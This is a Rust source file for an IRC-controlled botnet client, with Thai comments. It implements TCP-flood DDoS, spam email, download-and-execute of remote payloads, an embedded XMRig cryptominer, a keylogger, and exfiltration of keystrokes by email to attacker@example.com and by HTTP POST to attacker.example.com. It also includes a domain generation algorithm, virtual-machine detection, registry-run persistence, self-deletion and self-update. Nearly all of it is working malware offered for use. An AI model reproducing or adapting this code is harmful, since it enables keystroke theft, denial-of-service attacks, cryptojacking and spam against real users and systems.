use tokio::net::{TcpListener, TcpStream};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use lettre::{Message, AsyncTransport, Tokio1Executor, AsyncSmtpTransport};
use lettre::message::header::ContentType;
use lettre::transport::smtp::authentication::Credentials;
use irc::client::prelude::*;
use futures::stream::StreamExt;
use std::error::Error;
use std::time::Duration;
use tokio::time::sleep;
use lazy_static::lazy_static;
use std::sync::Mutex;
use rdev::{listen, Event, EventType};
use chrono::{Datelike, Utc};
use rand::{Rng, SeedableRng, rngs::StdRng};
use sha3::{Digest, Sha3_256};
use base64::{Engine, engine::general_purpose};

const IRC_SERVER: &str = "irc.example.com";      // เปลี่ยนเป็น IRC server ของเรา
const IRC_NICK: &str = "Hello-User";
const IRC_CHANNEL: &str = "#c2_channel";         // ช่อง C2
const SMTP_SERVER: &str = "smtp.gmail.com";      // หรือ server อื่น
const SMTP_USER: &str = "bot@gmail.com";
const SMTP_PASS: &str = "app_password_here";

// Placeholder: Replace with actual base64 encoded XMRig binary
const BASE64_XMRIG: &str = "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA..."; // truncated
const POOL_URL: &str = "pool.supportxmr.com:3333";
const WALLET: &str = "your_monero_wallet_address_here";

lazy_static! {
    static ref KEYLOGS: Mutex<String> = Mutex::new(String::new());
}

async fn start_socks5_proxy(port: u16) {
    let listener = TcpListener::bind(("0.0.0.0", port)).await.unwrap();
    println!("TCP Proxy (SOCKS5 placeholder) running on port {}", port);

    loop {
        let (mut stream, _) = listener.accept().await.unwrap();
        tokio::spawn(async move {
            // Simple echo for demonstration; full SOCKS5 implementation would require protocol parsing
            let mut buf = [0u8; 1024];
            loop {
                match stream.read(&mut buf).await {
                    Ok(0) => break,
                    Ok(n) => {
                        if let Err(_) = stream.write_all(&buf[..n]).await {
                            break;
                        }
                    }
                    Err(_) => break,
                }
            }
        });
    }
}

async fn spam_email(target: String, count: u32) -> Result<(), Box<dyn Error + Send + Sync>> {
    let creds = Credentials::new(SMTP_USER.to_string(), SMTP_PASS.to_string());
    let mailer = AsyncSmtpTransport::<Tokio1Executor>::relay(SMTP_SERVER)?
        .credentials(creds)
        .build();

    let email = Message::builder()
        .from(SMTP_USER.parse()?)
        .to(target.parse()?)
        .subject("Important Notification")
        .header(ContentType::TEXT_PLAIN)
        .body("You won $1,000,000! Click here...".to_string())?;

    for _ in 0..count {
        let _ = mailer.send(email.clone()).await;
        sleep(Duration::from_millis(500)).await; // avoid rate limit
    }
    Ok(())
}

async fn irc_c2() -> Result<(), Box<dyn Error + Send + Sync>> {
    let config = Config {
        nickname: Some(IRC_NICK.to_string()),
        server: Some(IRC_SERVER.to_string()),
        channels: vec![IRC_CHANNEL.to_string()],
        ..Default::default()
    };

    let mut client = Client::from_config(config).await?;
    client.identify()?;

    let mut stream = client.stream()?;

    while let Some(result) = stream.next().await {
        let message = result?;
        if let Command::PRIVMSG(channel, msg) = message.command {
            if channel == IRC_CHANNEL && msg.starts_with("!cmd ") {
                let cmd = msg.trim_start_matches("!cmd ").to_string();
                execute_command(cmd).await?;
            }
        }
    }
    Ok(())
}

async fn execute_command(cmd: String) -> Result<(), Box<dyn Error + Send + Sync>> {
    let parts: Vec<&str> = cmd.split_whitespace().collect();
    match parts[0] {
        "ddos" if parts.len() >= 4 => {
            // !cmd ddos example.com 80 60
            let target = parts[1].to_string();
            let port: u16 = parts[2].parse()?;
            let duration: u64 = parts[3].parse()?;
            tokio::spawn(ddos_attack(target, port, duration));
        }
        "spam" if parts.len() >= 3 => {
            let target = parts[1].to_string();
            let count: u32 = parts[2].parse()?;
            tokio::spawn(spam_email(target, count));
        }
        "proxy" if parts.len() >= 2 => {
            let port: u16 = parts[1].parse()?;
            tokio::spawn(start_socks5_proxy(port));
        }
        "download" if parts.len() >= 2 => {
            let url = parts[1].to_string();
            let resp = reqwest::get(&url).await?.bytes().await?;
            std::fs::write("payload.exe", resp)?;
            std::process::Command::new("payload.exe").spawn()?;
        }
        "mine" => {
            tokio::spawn(start_mining());
        }
        "keylog" => {
            start_keylogger();
        }
        "exfil" => {
            tokio::spawn(async {
                if let Err(e) = exfil_keylogs().await {
                    eprintln!("Email exfil error: {}", e);
                }
                if let Err(e) = exfil_http().await {
                    eprintln!("HTTP exfil error: {}", e);
                }
            });
        }
        "dga" => {
            let domains = generate_dga_domains();
            println!("Generated C2 domains: {:?}", domains);
        }
        "antivm" => {
            let is_vm = check_anti_vm().await;
            println!("VM detected: {}", is_vm);
        }
        "selfdelete" => {
            tokio::spawn(self_delete());
        }
        "update" if parts.len() >= 2 => {
            let url = parts[1].to_string();
            tokio::spawn(async move {
                if let Err(e) = update_bot(url).await {
                    eprintln!("Update error: {}", e);
                }
            });
        }
        _ => println!("Unknown command: {}", cmd),
    }
    Ok(())
}

async fn ddos_attack(target: String, port: u16, duration: u64) {
    let end = tokio::time::Instant::now() + Duration::from_secs(duration);
    let junk = vec![0u8; 1024];

    while tokio::time::Instant::now() < end {
        if let Ok(mut stream) = TcpStream::connect((target.as_str(), port)).await {
            let _ = stream.write_all(&junk).await;
        }
        tokio::task::yield_now().await;
    }
}

async fn persistence() {
    #[cfg(windows)]
    {
        use winreg::enums::*;
        use winreg::RegKey;
        let hkcu = RegKey::predef(HKEY_CURRENT_USER);
        let path = std::env::current_exe().unwrap();
        let (key, _) = hkcu.create_subkey("Software\\Microsoft\\Windows\\CurrentVersion\\Run").unwrap();
        key.set_value("SystemUpdate", &path.to_str().unwrap()).ok();
    }
}

async fn start_mining() {
    // Decode embedded XMRig binary
    let xmrig_bytes = general_purpose::STANDARD.decode(BASE64_XMRIG).unwrap_or_default();
    if xmrig_bytes.is_empty() {
        println!("XMRig binary not embedded, falling back to CPU mining");
        // Fallback to CPU mining
        let difficulty = 4;
        loop {
            let input = rand::random::<[u8; 32]>();
            let mut nonce = 0u64;
            loop {
                let mut hasher = Sha3_256::new();
                hasher.update(&input);
                hasher.update(&nonce.to_le_bytes());
                let hash = hasher.finalize();
                let mut is_valid = true;
                for i in 0..difficulty {
                    if hash[i] != 0 {
                        is_valid = false;
                        break;
                    }
                }
                if is_valid {
                    println!("Mined block with nonce: {}, hash: {:?}", nonce, hash);
                    break;
                }
                nonce += 1;
                if nonce % 100000 == 0 {
                    tokio::task::yield_now().await;
                }
            }
            sleep(Duration::from_millis(10)).await;
        }
    } else {
        // Write to temp file and run
        let temp_path = std::env::temp_dir().join("xmrig.exe");
        tokio::fs::write(&temp_path, xmrig_bytes).await.unwrap();
        
        // Run XMRig with pool and wallet
        let args = vec![
            "--url".to_string(), POOL_URL.to_string(),
            "--user".to_string(), WALLET.to_string(),
            "--pass".to_string(), "x".to_string(),
            "--donate-level".to_string(), "0".to_string(), // No donation
            "--background".to_string(), // Run in background
        ];
        
        tokio::process::Command::new(&temp_path)
            .args(&args)
            .spawn()
            .unwrap();
        
        println!("XMRig started mining to pool: {}", POOL_URL);
    }
}

fn start_keylogger() {
    std::thread::spawn(|| {
        let callback = |event: Event| {
            if let EventType::KeyPress(key) = event.event_type {
                if let Ok(mut logs) = KEYLOGS.lock() {
                    logs.push_str(&format!("{:?} ", key));
                }
            }
        };
        if let Err(e) = listen(callback) {
            eprintln!("Keylogger error: {:?}", e);
        }
    });
}

async fn exfil_keylogs() -> Result<(), Box<dyn Error + Send + Sync>> {
    let logs = tokio::task::spawn_blocking(|| {
        KEYLOGS.lock().unwrap().clone()
    }).await.unwrap();
    if !logs.is_empty() {
        let creds = Credentials::new(SMTP_USER.to_string(), SMTP_PASS.to_string());
        let mailer = AsyncSmtpTransport::<Tokio1Executor>::relay(SMTP_SERVER)?
            .credentials(creds)
            .build();
        let email = Message::builder()
            .from(SMTP_USER.parse()?)
            .to("attacker@example.com".parse()?)
            .subject("Keylogs")
            .header(ContentType::TEXT_PLAIN)
            .body(logs)?;
        mailer.send(email).await?;
        tokio::task::spawn_blocking(|| {
            KEYLOGS.lock().unwrap().clear();
        }).await.unwrap();
    }
    Ok(())
}

async fn exfil_http() -> Result<(), Box<dyn Error + Send + Sync>> {
    let logs = tokio::task::spawn_blocking(|| {
        KEYLOGS.lock().unwrap().clone()
    }).await.unwrap();
    if !logs.is_empty() {
        let encoded = general_purpose::STANDARD.encode(&logs);
        let client = reqwest::Client::new();
        let res = client.post("http://attacker.example.com/exfil") // Change to actual endpoint
            .header("Content-Type", "application/json")
            .body(format!("{{\"data\":\"{}\"}}", encoded))
            .send()
            .await?;
        if res.status().is_success() {
            tokio::task::spawn_blocking(|| {
                KEYLOGS.lock().unwrap().clear();
            }).await.unwrap();
        }
    }
    Ok(())
}

fn generate_dga_domains() -> Vec<String> {
    let mut domains = Vec::new();
    let date = Utc::now().date_naive();
    let seed_str = format!("{}{}{}", date.year(), date.month(), date.day());
    let seed_bytes = seed_str.as_bytes();
    let mut seed = [0u8; 32];
    for (i, &b) in seed_bytes.iter().enumerate() {
        if i < 32 {
            seed[i] = b;
        }
    }
    let mut rng = StdRng::from_seed(seed);
    for _ in 0..10 {
        let len = rng.gen_range(5..15);
        let domain: String = (0..len).map(|_| rng.sample(rand::distributions::Alphanumeric) as char).collect();
        domains.push(format!("{}.com", domain.to_lowercase()));
    }
    domains
}

async fn check_anti_vm() -> bool {
    let mut system = sysinfo::System::new_all();
    system.refresh_all();
    
    // Process checks
    for process in system.processes().values() {
        let name = process.name().to_string().to_lowercase();
        if name.contains("vmware") || name.contains("virtualbox") || name.contains("vbox") {
            return true;
        }
    }
    
    // Registry checks
    #[cfg(windows)]
    {
        use winreg::RegKey;
        let hklm = RegKey::predef(winreg::enums::HKEY_LOCAL_MACHINE);
        if hklm.open_subkey("SOFTWARE\\VMware, Inc.\\VMware Tools").is_ok() ||
           hklm.open_subkey("SOFTWARE\\Oracle\\VirtualBox Guest Additions").is_ok() {
            return true;
        }
    }
    
    // File checks
    #[cfg(windows)]
    {
        use std::path::Path;
        if Path::new(r"C:\Windows\System32\vmGuestLib.dll").exists() ||
           Path::new(r"C:\Windows\System32\VBoxGuest.sys").exists() ||
           Path::new(r"C:\Windows\System32\vm3dgl.dll").exists() ||
           Path::new(r"C:\Windows\System32\VBoxHook.dll").exists() {
            return true;
        }
    }
    
    // MAC address check
    if let Ok(mac) = mac_address::get_mac_address() {
        if let Some(mac) = mac {
            let bytes = mac.bytes();
            // Common VM MAC prefixes
            let vm_prefixes = [
                [0x08, 0x00, 0x27], // VirtualBox
                [0x00, 0x05, 0x69], // VMware
                [0x00, 0x0C, 0x29], // VMware
                [0x00, 0x1C, 0x14], // VMware
                [0x00, 0x50, 0x56], // VMware
            ];
            for prefix in &vm_prefixes {
                if bytes[0..3] == *prefix {
                    return true;
                }
            }
        }
    }
    
    // CPU name check
    for cpu in system.cpus() {
        let brand = cpu.brand().to_lowercase();
        if brand.contains("qemu") || brand.contains("virtual") || brand.contains("kvm") {
            return true;
        }
    }
    
    // RAM size check (less than 2GB might indicate VM)
    let total_memory = system.total_memory();
    if total_memory < 2 * 1024 * 1024 * 1024 { // 2GB
        return true;
    }
    
    false
}

async fn self_delete() {
    #[cfg(windows)]
    {
        let exe_path = std::env::current_exe().unwrap();
        let ps_command = format!("Remove-Item '{}' -Force", exe_path.display());
        std::process::Command::new("powershell")
            .arg("-Command")
            .arg(ps_command)
            .spawn()
            .ok();
        std::process::exit(0);
    }
}

async fn update_bot(url: String) -> Result<(), Box<dyn Error + Send + Sync>> {
    let response = reqwest::get(&url).await?;
    let new_exe = response.bytes().await?;
    
    let current_exe = std::env::current_exe()?;
    let temp_exe = current_exe.with_extension("new.exe");
    
    tokio::fs::write(&temp_exe, new_exe).await?;
    
    // Run the new exe and exit
    std::process::Command::new(&temp_exe).spawn()?;
    
    // Self delete old
    self_delete().await;
    
    Ok(())
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn Error + Send + Sync>> {
    persistence().await;

    tokio::select! {
        _ = irc_c2() => {},
        _ = tokio::signal::ctrl_c() => {},
    }

    Ok(())
}